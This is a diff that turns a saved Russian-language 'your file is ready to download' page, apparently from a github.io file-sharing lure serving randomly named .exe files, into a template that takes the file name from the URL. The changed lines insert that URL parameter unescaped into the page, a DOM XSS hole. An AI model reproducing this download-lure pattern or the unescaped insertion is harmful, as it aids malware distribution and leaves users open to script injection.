@@ -1,11 +1,10 @@
 
-<!-- saved from url=(0078)https://tikig1.github.io/file-sharing/download.html?name=Wa3Rix_231848311-.exe -->
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=10">
     <title>Идёт подготовка к скачиванию</title>
-   <script src="./dl_files/jquery.min.js"></script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
 <script> 
 var n = location.search.replace('?name=', ''); 
 if(n.length > 0){
@@ -120,9 +119,9 @@ $.ajax({
     <br>
     <h1></h1>
 </div>
-<div id="dl" class="wrapper" style="cursor: hand;"> 
-    <h1 id="n">Ваш файл Wa3Rix готов к скачиванию</h1>
-    <a class="btn readyLink"><strong>Скачать</strong> <small id="nm">Wa3Rix</small></a>
+<div id="dl" class="wrapper" style="cursor: hand;" > 
+    <h1 id="n"></h1>
+    <a class="btn readyLink"><strong>Скачать</strong> <small id="nm"></small></a>
 </div>
 
 <script>
@@ -131,6 +130,5 @@ $("#n").html('Ваш файл '+ n.replace(/\_[(0-9)]+\-\.exe/g, '').substr(0, 3
 $("#nm").html(n.replace(/\_[(0-9)]+\-\.exe/g, '').substr(0, 30)); 
 
 </script>
-
 
 </body></html>
